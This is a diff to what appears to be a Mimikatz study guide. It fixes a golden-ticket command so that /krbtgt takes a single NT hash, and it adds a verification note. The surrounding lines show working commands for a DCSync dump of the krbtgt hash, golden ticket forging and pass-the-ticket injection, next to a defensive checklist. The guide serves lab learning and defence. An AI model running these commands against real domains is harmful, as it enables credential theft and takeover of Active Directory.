@@ -63,8 +63,9 @@ mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
 
 # 5. Golden ticket: forge a TGT for any user you want
 #    SID = the DOMAIN SID (from: whoami /user on any domain host, minus the
-#    final -500/-512 RID). krbtgt hash from the DCSync output above.
-mimikatz.exe "kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:aad3b435b51404eeaad3b435b51404ee:2e2e2e... /ptt" exit
+#    final -500/-512 RID). /krbtgt takes the single NT hash from the DCSync
+#    output above (32 hex chars): it is an alias of /rc4, not an LM:NT pair.
+mimikatz.exe "kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e /ptt" exit
 
 # 6. Pass-the-ticket: inject an exported .kirbi ticket you captured elsewhere
 mimikatz.exe "kerberos::ptt C:\Users\Public\admin.kirbi" exit
@@ -135,6 +136,11 @@ and alert on LSASS handle access and on `sekurlsa`/`lsadump` command lines.
 - [ ] I can list the main defenses that block Mimikatz (Credential Guard, LSA Protection, AV/EDR)
 - [ ] I understand why plaintext output is rare on modern Windows (WDigest off)
 - [ ] I have only ever run Mimikatz in my own authorized lab environment
+
+> **Verification:** not run — mimikatz is a Windows binary, it is not installed here and forging
+> tickets needs a domain. Checked against upstream `mimikatz/modules/kerberos/kuhl_m_kerberos.c`
+> on 2026-09-19: line 434 binds `/krbtgt` as an alias of `/rc4`, both filling **one** key argument
+> (`KERB_ETYPE_RC4_HMAC_NT`), so an LM:NT pair is rejected — the example now passes a single NT hash.
 
 ## Further Resources
 
